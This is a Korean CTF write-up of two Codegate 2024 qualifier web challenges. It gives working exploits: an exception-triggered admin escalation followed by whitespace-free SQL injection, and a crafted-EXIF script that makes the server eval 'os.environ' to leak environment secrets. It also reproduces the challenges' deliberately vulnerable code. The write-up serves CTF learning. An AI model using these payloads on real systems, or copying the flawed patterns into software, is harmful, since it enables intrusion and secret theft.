---
title: Codegate Qual 2024 Writeup and Review
published: 2024-08-31
tags: [web]
category: CTF
draft: false
---

### Table of contents

- writeup
  - [ShieldOSINT (437pt, 13solves)](#shildosint)
  - [combination (741pt, 6solves)](#combination)

# Writeup

## ShildOSINT

:::important[info]

- keywords: `null pointer exception`, `sql injection`

:::

코틀린 + spring으로 구성된 서비스이다. 먼저 플래그의 위치를 확인하면

```kotlin
val insertDataSQL = "INSERT INTO SITE_SECRET (sdata) VALUES ('codegate2024{testflag}');"
```

sql 에 저장된다. 그래서 이 문제를 해결하기 위해 아마 sql injection이 사용될거라고 추측했다.  
이후로 sql를 건드리는 코드를 집중적으로 확인했다.  
`/api/` 부분 파일을 확인하는 중에 의심되는 코드를 발견했는데,

```kotlin
@RequestMapping("/api/v6/shieldosint")
@Controller
class ApiController(private val userService: UserService) {
    @EndPointManager
    @PreAuthorize("isAuthenticated()")
    @GetMapping("/search")
    @ResponseBody
    fun search(
        principal: Principal,
        @RequestParam("s", required = false, defaultValue = "testQuery") searchcheck: String = "",
        @RequestParam("q", required = false, defaultValue = "") querycheck: String = "",
        @RequestParam("mp", required = false, defaultValue = "") magiccheck: String = ""
    ): String {
        try {
            val siteUser = userService!!.getUser(principal.name)

            if (siteUser.session != "null") {
                val reflectionController = ReflectionController()

                val dataProvider = DataProvider()
                dataProvider.initializeDatabase()

                val methodName = searchcheck
                val defaultQueryResult = reflectionController.reflectMethod(methodName)

                val query = querycheck

                if (query.isNotEmpty()) {
                    val customQueryResult = reflectionController.reflectMethod(methodName, query, magiccheck)
                    return "Query Result: $customQueryResult"
                } else {
                    return "Query Result: $defaultQueryResult"
                }
            }
            else {
                return "session null ${siteUser.username}<br>${siteUser.session}"
            }

        } catch (e: Exception) {
            return "Error"
        }
    }

    ...
}
```

여기서 `reflectMethod` 함수를 사용해서 Query를 실행하는 모습을 확인했다. `relfectMethod` 함수는

```kotlin
class ReflectionController {

    fun reflectMethod(
        methodName: String,
        query: String? = null,
        magicParam: Any? = null
    ): String {
        return try {
            val clazz = DataProvider::class
            val instance = clazz.createInstance()

            val method: KCallable<*>? = clazz.declaredFunctions.firstOrNull { it.name == methodName }

            if (method != null) {
                if (query != null && query.isNotEmpty()) {
                    when (magicParam) {
                        is String -> {
                            val finalQuery = query.split(" ")[2]
                            method.call(instance, finalQuery) as String
                        }
                        is Int -> {
                            val finalQuery = query.split(" ").last()
                            method.call(instance, finalQuery) as String
                        }
                        is Boolean -> {
                            val finalQuery = query.split(" ").first()
                            method.call(instance, finalQuery) as String
                        }
                        else -> method.call(instance, query) as String
                    }
                } else {
                    method.call(instance, "") as String
                }
            } else {
                "Method not found"
            }
        } catch (e: Exception) {
            "An error occurred: ${e.message}"
        }
    }
}
```

`DataProvide` 클래스에 있는 메소드들을 실행시킬 수 있는 기능을 가진 함수인 것을 확인할 수 있다.
그럼 또 `DataProvid` 클래스의 메소드를 확인해서 어느 메소드를 사용하여 익스할지 골라야 하므로 코드를 보면

```kotlin
fun filterQuery(query: String): String {
    val hasWhitespace = Regex("\\s")
    val containsRuntime = Regex("(?i)runtime")
    val containsJava = Regex("(?i)java")
    val special_check1 = Regex("/")
    val special_check2 = Regex("\\*")
    val special_check3 = Regex("%")
    val special_check4 = Regex("(?i)DROP")
    val special_check5 = Regex("(?i)DELETE")
    val isLengthValid = query.length <= 40

    if (hasWhitespace.containsMatchIn(query) || containsRuntime.containsMatchIn(query) || containsJava.containsMatchIn(query) || special_check1.containsMatchIn(query) || special_check2.containsMatchIn(query) || special_check3.containsMatchIn(query) || special_check4.containsMatchIn(query) || special_check5.containsMatchIn(query) || !isLengthValid) {
        return ""
    }

    return query
}

fun selectQuery(query: String = ""): String {
    val selectSQL = "SELECT SUBJECT FROM QUESTION WHERE ID>=1 and ID<=10"

    val filteredQuery = filterQuery(query)
    val finalQuery = if (filteredQuery.isNotBlank()) "$selectSQL $filteredQuery" else selectSQL
    println("Executing SQL: $finalQuery")

    try {
        getConnection().use { connection ->
            connection.createStatement().use { statement ->
                val resultSet = statement.executeQuery(finalQuery)
                val results = StringBuilder()

                while (resultSet.next()) {
                    results.append(resultSet.getString(1)).append("\n")
                }

                return results.toString().trim()
            }
        }
    } catch (e: SQLException) {
        e.printStackTrace()
    }
    return "fail"
}
```

이 `selectQuery` 함수가 굉장히 수상해보인다. 누가봐도 sql injection을 진행해야할 것 같이 생겼으므로 이 함수를 사용한다고 가정하면 시나리오는 다음과 같다.

1. `/api/v6/shieldosint/search` 접근하기 위한 `@EndPointManager`,`@PreAuthorize("isAuthenticated()")` 조건을 만족
2. 코드를 분석하여 `s`, `q`, `mp` parameter를 변조하여 sql injection
  
먼저 `@PreQuthorize("isAuthenticated()")`는 단순히 로그인을 하면 만족시키므로 문제가 없지만, `@EndPointManager`는 user의 권한이 `ROLE_ADMIN` 일 때만 요청을 보낼 수 있게 작성되어 있다. 이 것을 찾기 위해, 전체 소스코드에서 `ROLE_ADMIN`를 검색하여 필요한 코드를 찾을 수 있다.

```kotlin
class ShieldCloud : AuthenticationSuccessHandler {

    override fun onAuthenticationSuccess(
        request: HttpServletRequest,
        response: HttpServletResponse,
        authentication: Authentication
    ) {
        val authorities: MutableList<GrantedAuthority> = authentication.authorities.toMutableList()
        val shieldParamdata = request.getParameter("ShieldParam")
        var user_role: String = "false"

        if (shieldParamdata != null) {
            try {
                val shieldParamNode: JsonNode = ObjectMapper().readTree(shieldParamdata)
                val shieldParam = shieldParamNode!!.get("user_role")
                println("shieldParam: ${shieldParam} type: ${shieldParam::class.simpleName}")

                user_role = shieldParam?.toString() ?: "false"

                if (user_role == "true") {
                    authorities.add(SimpleGrantedAuthority("ROLE_USER"))
                }

            } catch (e: JsonParseException) {
                authorities.add(SimpleGrantedAuthority("ROLE_USER"))
            } catch (e: Exception) {
                    authorities.add(SimpleGrantedAuthority("ROLE_ADMIN")) // 누가봐도 수상함
            }
        } else {
            authorities.add(SimpleGrantedAuthority("ROLE_USER"))
        }

        val newAuth = UsernamePasswordAuthenticationToken(
            authentication.principal,
            authentication.credentials,
            authorities
        )

        SecurityContextHolder.getContext().authentication = newAuth

        response.sendRedirect("/")
    }
}
```

코드를 보면 누가봐도 수상한 권한 부여가 있는데, 이를 통해 shieldParam을 json.load 시킨 다음 `user_role` value 값을 얻는 과정에서 `JsonParseException`이 아닌 다른 에러가 나도록 의도적으로 발생시켜야 한다. 이 때 우리는 `user_role`라는 key값을 가지지 않는 json을 만들어 `NullPointerException` 에러를 발생시켜 관리자 권한을 획득할 수 있다.  
![](./img/1.png)
따라서 나는 `POST /user/login` 엔드포인트로 body 부분에 `&shieldParam={"test":"test"}` 데이터를 추가하여 관리자 권한을 획득했다.  

이를 통해 관리자 권한을 획득한 후 이제 `/api/v6/shieldosint/search`에 접근해보려 했더니

![](./img/2.png)

다음과 같이 이상한 로그가 뜬다. 코드를 확인해보면 `siteUser.session`이 null이기 때문이라는 것을 알 수 있는데, 이는 `GET /api/v6/shieldosint/query?q=Y` 요청으로 session을 추가해 손쉽게 해결할 수 있다.  
이제 마지막으로, sql injection을 수행하면 된다.
`filterQuery` 함수에서 공백과 주석(*, /)을 모조리 막기 때문에 괄호를 이용해서 최종 페이로드를 작성했다.

```url
/api/v6/shieldosint/search?s=selectQuery&q=a a union(select(sdata)from(SITE_SECRET))&mp=a
```

![](./img/3.png)
그럼 짜잔! 플래그가 나온다

## combination

:::important[info]

- keywords: `jpeg exif`, `eval injection`

:::

문제를 보면 누가봐도 수상한 `safe_eval` 이라는 함수가 있다.
```py
def safe_eval(code_string):
    allowed_globals = {
        "__builtins__": {
            'os': os,
        },
    }
    allowed_locals = {}

    try:
        return eval(code_string, allowed_globals, allowed_locals)
    except Exception as e:
        print(f"Error evaluating code: {e}")
        return None
```
eval에 옵션을 추가한 것 같은데, 플래그는 환경변수에 있으므로 다음과 같은 테스트 코드를 작성해 `code_string` 파라메터에 어떤 문자를 입력해야 leak이 가능한지 테스트해보았다.
```py
import os
import re

def safe_eval(code_string):
    allowed_globals = {
        "__builtins__": {
            'os': os,
        },
    }
    allowed_locals = {}

    try:
        return eval(code_string, allowed_globals, allowed_locals)
    except Exception as e:
        print(f"Error evaluating code: {e}")
        return None
    
domain_pattern = r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z]{2,})+$"
ipv6_pattern = r"^([0-9a-fA-F]{1,4}:){7}([0-9a-fA-F]{1,4}|:)$|^(([0-9a-fA-F]{1,4}:){1,7}|:):([0-9a-fA-F]{1,4}|:)(:[0-9a-fA-F]{1,4}){1,6}$|^([0-9a-fA-F]{1,4}:){1,6}::([0-9a-fA-F]{1,4}:){1,5}([0-9a-fA-F]{1,4}|:)(:[0-9a-fA-F]{1,4}){1,4}$|^([0-9a-fA-F]{1,4}:){1,5}::([0-9a-fA-F]{1,4}:){1,4}([0-9a-fA-F]{1,4}|:)(:[0-9a-fA-F]{1,4}){1,3}$|^([0-9a-fA-F]{1,4}:){1,4}::([0-9a-fA-F]{1,4}:){1,3}([0-9a-fA-F]{1,4}|:)(:[0-9a-fA-F]{1,4}){1,2}$|^([0-9a-fA-F]{1,4}:){1,3}::([0-9a-fA-F]{1,4}:){1,2}([0-9a-fA-F]{1,4}|:)(:[0-9a-fA-F]{1,4}){1}$|^([0-9a-fA-F]{1,4}:){1,2}::[0-9a-fA-F]{1,4}:([0-9a-fA-F]{1,4}){1,6}$|^([0-9a-fA-F]{1,4}:){1,1}::([0-9a-fA-F]{1,4}:){1,7}|::([0-9a-fA-F]{1,4}:){1,7}$|^::$"
ipv4_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'

def validate_domain(domain):
    if re.match(domain_pattern, domain) == None:
        return 0
    else:
        return 1
    
def validate_ipv4(ipv4):
    if re.match(ipv4_pattern, ipv4) == None:
        return 0
    else:
        return 1

def validate_ipv6(ipv6):
    if re.match(ipv6_pattern, ipv6) == None:
        return 0
    else:
        return 1
    
a = safe_eval('os.environ')
print(a)
```
```console
exon@DESKTOP-541R960:/combination$ python3 test.py
environ({'SHELL': '/bin/bash', 'NVM_RC_VERSION': '', 'WSL2_GUI_APPS_ENABLED': '1', 'WSL_DISTRO_NAME': 'Ubuntu', 'NAME': 'DESKTOP-541R960', 'PWD': '/mnt/d/hacking/ctf/2024/codegate/qual/web/combination', 'LOGNAME': 'exon', 'HOME': '/home/exon', 'LANG': 'C.UTF-8', 'WSL_INTEROP': '/run/WSL/1354_interop', ....
```
성공적으로 도메인 필터링도 우회하면서 환경변수를 출력한다. 그럼 이제 어떤 로직을 통해서 `code_string` 파라메터를 조작할 수 있을지 분석해야 한다.  
코드를 보다보면 이미지의 픽셀보다 exif 같은 정보들이 `code_string`에 영향을 주는 것을 알 수 있기에 exif 위주로 분석하면
```py
elif file_ext in ['.jpg', '.jpeg']:
    exif_data = {}
    img1 = Image.open(image_path1)
    img2 = Image.open(image_path2)
    
    try:
        exif_data1 = get_info_data(img1)
        exif_data2 = get_info_data(img2)

        exif_data3 = get_exif_data(img1)
        exif_data4 = get_exif_data(img2)
    except Exception as e:
        bw_img.save(output_path, 'JPEG')
        return jsonify({'message': 'Struct is invalid. but, Files successfully uploaded and validated'}), 200
    
    merged_exif_data = merge_info_data(exif_data1, exif_data2)
    merged_exif_data2 = merge_exif_data(exif_data3, exif_data4)
    print('merged_exif_data2: ', merged_exif_data2)

    exif_bytes = convert_exif_data_to_piexif_format(merged_exif_data2)
    print('exif_bytes: ', exif_bytes)
    bw_img.save(output_path, 'JPEG', exif=exif_bytes)
```
일단 처음 `/upload` 에서는 jpg 또는 jpeg 파일의 형식일 때 exif를 두개를 합치는 것을 볼 수 있다. 이렇게 merge한 파일을 `/verify` 에서 인증을 받아야 하는데,
```py
elif file_ext in ['.jpg', '.jpeg']:
    img = Image.open(new_file_path)                
    try:
        if 'exif' in img.info:
            exif_data = img.info['exif']
            print('exif_data: ', exif_data)
            if b"CODEGATE2024\x00" not in exif_data:
                return  jsonify({'error': 'Unsupported file parse1'}), 400
            
            json_start_marker = b"CODEGATE2024\x00"
            json_start_index = exif_data.find(json_start_marker) + len(json_start_marker) # 13
            json_data_bytes = exif_data[json_start_index:]
            print('json_data_bytes: ', json_data_bytes)
            json_data_str = json_data_bytes.decode('ascii')

            try:
                json_data = json.loads(json_data_str)
                print('json_data: ', json_data)
            except json.JSONDecodeError:
                json_data = None
                return jsonify({'success': "Verified"}), 200

    except KeyError as e:
        print('Index is not included')

    try:
        exif_data = img._getexif()
        print('!!exif_data: ', exif_data)
        if exif_data:
            exif = {ExifTags.TAGS.get(tag, tag): value for tag, value in exif_data.items()}
            print('exif: ', exif)
            for key, value in exif.items():
                if "ImageDescription" in key:
                    print('value: ', value)
                    ret = validate_domain(value) or validate_ipv4(value) or validate_ipv6(value)
                    if not ret:
                        return jsonify({'success': 'Verified'})
                    if "(" in value:
                        return jsonify({'success': 'Verified'})
                    if ")" in value:
                        return jsonify({'success': 'Verified'})
                    description_contents = safe_eval(value)
                    items_dict = dict(description_contents)
                    return jsonify({'debug': f'{items_dict}' })
    except Exception as e:
        print('!!!!!!!!!!!!!!!!!!!!', e)
```
참고로 중간중간 보이는 print 구문은 내가 디버깅하려고 추가한거다.  
어쨌든 eval을 실행하기 위해서 해야할 것은 다음과 같은데
1. `img.info['exif']`에 `b"CODEGATE2024\x00"` 가 존재해야함
2. `img.info['exif']`에서 `b"CODEGATE2024\x00"` 이후에 모든 문자를 json으로 변환 할 때 오류가 없어야함
3. `img._getexif()`의 `ImageDescription`이 도메인 체크 함수를 통과하고, 소괄호가 없어야함  

처음 문제를 풀 때 1번은 쉽게 만족시켰지만 2번 조건을 해결하려고 할 때 json 형식으로 만들어놓은 exif 뒤에 자꾸 `\x00` null 문자가 생겨서 오류가 났었다. 나는 이를 해결하기 위해 exif에서 가장 마지막에 위치한 필드를 사용해보았고 성공했다!!  
  
  
최종 익스코드는 다음과 같다.
```py
from PIL import Image
import piexif
import io

image = Image.new("RGB", (100, 100), color=(255, 0, 0))
exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "Interop": {}, "1st": {}, "thumbnail": None}

exif_dict["Exif"][piexif.ExifIFD.UserComment] = 'CODEGATE2024\x00{"test":"test"}'.encode("utf-8")
exif_dict["0th"][piexif.ImageIFD.ImageDescription] = 'os.environ'.encode("utf-8")
exif_bytes = piexif.dump(exif_dict)
output = io.BytesIO()
image.save(output, "jpeg", exif=exif_bytes)
output.seek(0)

with open("imageA.jpeg", "wb") as f:
    f.write(output.read())
    
image = Image.new("RGB", (100, 100), color=(255, 255, 0))
output = io.BytesIO()
image.save(output, "jpeg")
output.seek(0)

with open("imageB.jpeg", "wb") as f:
    f.write(output.read())
    
    
from requests import *

url = 'http://43.201.116.50:3456'

s = Session()

res = s.post(url+'/upload', files={'file-a': open('imageA.jpeg', 'rb'), 'file-b': open('imageB.jpeg', 'rb')})
print(res.text)

res = s.request('TRACE', url+'/verify')
print(eval(res.json()['debug'])['FLAG'])
```
```console
exon@DESKTOP-541R960:/combination$ python3 ex.py
{"message":"Files successfully uploaded and validated"}

codegate2024{e46fe4abeff3affa1a3f37f4b555345dc342b1a6}
```